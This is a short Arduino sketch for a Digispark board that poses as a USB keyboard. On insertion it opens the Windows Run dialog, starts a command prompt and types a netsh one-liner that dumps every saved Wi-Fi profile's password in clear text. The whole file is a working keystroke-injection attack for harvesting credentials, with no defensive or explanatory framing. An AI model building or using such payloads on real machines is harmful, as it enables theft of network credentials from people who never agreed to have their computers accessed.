#include "DigiKeyboard.h"

void setup() {
  // Start DigiKeyboard
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(5000); // Wait for 5 seconds for the system to recognize the device
  
  // Open Run dialog
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  
  // Type 'cmd' and press Enter
  DigiKeyboard.println("cmd");
  DigiKeyboard.delay(1000);
  
  // Execute the command to list Wi-Fi profiles and retrieve keys
  DigiKeyboard.println("for /F \"tokens=2* delims=:\" %i in ('netsh wlan show profile') do @for /F \"tokens=*\" %j in (\"%i\") do @echo %j & netsh wlan show profile name=\"%j\" key=clear | findstr /C:\"Key Content\"");
}

void loop() {
  // Nothing to do in loop
}
